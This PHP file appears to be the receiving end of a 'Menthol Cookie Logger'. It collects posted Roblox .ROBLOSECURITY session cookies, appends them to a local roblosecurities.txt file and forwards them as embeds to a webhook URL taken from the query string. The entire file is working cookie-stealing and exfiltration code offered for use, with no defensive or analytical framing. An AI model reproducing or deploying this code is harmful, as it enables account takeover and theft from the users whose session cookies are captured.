<?php

$json = file_get_contents('php://input');
$data = json_decode($json, true);
$webhook = $_GET['Webhook'];
$timestamp = date("c", strtotime("now"));
$fields = [];

function CurlSend($Link,$HeaderArray){
	$Curl = curl_init($Link);
	curl_setopt_array($Curl,$HeaderArray);
	$Response = curl_exec($Curl);
	curl_close($Curl);
	return $Response;
}

foreach ($data as $arr) {
    foreach($arr as $cookie) {
        $File = fopen("../cookies/roblosecurities.txt","a");
        fwrite($File,"$cookie\n\n");
        fclose($File);
        array_push($fields, [
            "name" => ".ROBLOSECURITY",
            "value" => "```".$cookie."```",
            "inline" => false
        ]);
    }
}


$postdata = json_encode([
    "username" => "Menthol",
    "tts" => false,
    "embeds" => [
        [
            "title" => "Menthol Cookie Logger",
            "type" => "rich",
            "description" => "",
            "timestamp" => $timestamp,
            "color" => hexdec( "3366ff" ),
            "fields" => $fields,
        ]
    ]
], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

$ch = curl_init();
curl_setopt_array( $ch, [
    CURLOPT_URL => $webhook,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $postdata,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);
$response = curl_exec( $ch );
curl_close( $ch );
?>
